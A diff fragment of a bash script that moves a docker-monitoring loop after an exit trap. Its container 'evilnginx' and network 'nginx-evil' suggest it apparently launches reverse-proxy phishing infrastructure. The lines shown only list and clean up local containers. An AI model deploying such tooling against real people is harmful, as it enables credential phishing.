@@ -27,7 +27,7 @@ fi ; exit 0 ; fi
 
 # Variables
 WEBPAGE=$1
-while true ; do clear; banner; instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); for ins in $(echo $instances); do echo "http://localhost/$ins"; done; sleep 15; done
+
 
 path=$(pwd)
 printf "\n\e[1;33m[>]Preparando nginx..."
@@ -59,6 +59,6 @@ sudo docker stop evilnginx > /dev/null 2>&1 &
 sudo docker network rm nginx-evil > /dev/null 2>&1 &
 printf "\n\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
 
-
+while true ; do clear; banner; instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); for ins in $(echo $instances); do echo "http://localhost/$ins"; done; sleep 15; done
 
 #echo 'instances=$(sudo docker  ps | grep 5980 | awk -F"tcp" '{print $2}' | tr -d " "); for ins in $(echo $instances); do sudo docker stop $ins; done &'
